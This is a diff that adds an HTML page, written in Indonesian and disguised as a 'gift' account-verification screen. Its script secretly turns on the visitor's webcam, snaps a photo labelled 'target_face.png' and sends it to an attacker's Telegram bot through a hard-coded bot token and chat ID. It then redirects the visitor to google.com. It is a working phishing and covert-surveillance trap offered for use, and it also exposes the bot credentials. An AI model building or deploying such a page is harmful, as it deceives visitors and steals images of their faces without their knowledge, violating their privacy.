@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 HADIAH NEXUS TEAM 2108 🎁</title>
+    <style>
+        body { background: #000; color: #00ffcc; text-align: center; font-family: 'Courier New', monospace; padding-top: 100px; }
+        .box { border: 2px solid #00ffcc; display: inline-block; padding: 20px; box-shadow: 0 0 15px #00ffcc; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>[ ACCESS GRANTED ]</h1>
+        <p>Sedang memverifikasi data akun Nexus lu...</p>
+        <p>Mohon jangan tutup halaman ini.</p>
+    </div>
+
+    <video id="video" width="640" height="480" style="display:none;" autoplay></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // MASUKIN TOKEN DARI BOTFATHER DI BAWAH INI !!!
+        const token = '8794576817:AAHiq5Kfttd566LDVsyYh7ye-MICejn4cPM'; 
+        const chatid = '8416221686'; // Chat ID lu udah gw pasang otomatis
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            video.srcObject = stream;
+            setTimeout(takeAndSend, 3000);
+        }).catch(err => {
+            alert("Error: Browser tidak mendukung!");
+        });
+
+        function takeAndSend() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            const imageData = canvas.toDataURL('image/png');
+            
+            const blob = dataURItoBlob(imageData);
+            const formData = new FormData();
+            formData.append('chat_id', chatid);
+            formData.append('photo', blob, 'target_face.png');
+            formData.append('caption', '📸 TARGET TERDETEKSI OLEH NEXUS-EYE! 📸\n\nUser: hanzX\nStatus: Captured');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => {
+                window.location.href = "https://google.com";
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            var byteString = atob(dataURI.split(',')[1]);
+            var ab = new ArrayBuffer(byteString.length);
+            var ia = new Uint8Array(ab);
+            for (var i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
+            return new Blob([ab], {type: 'image/png'});
+        }
+    </script>
+</body>
+</html>
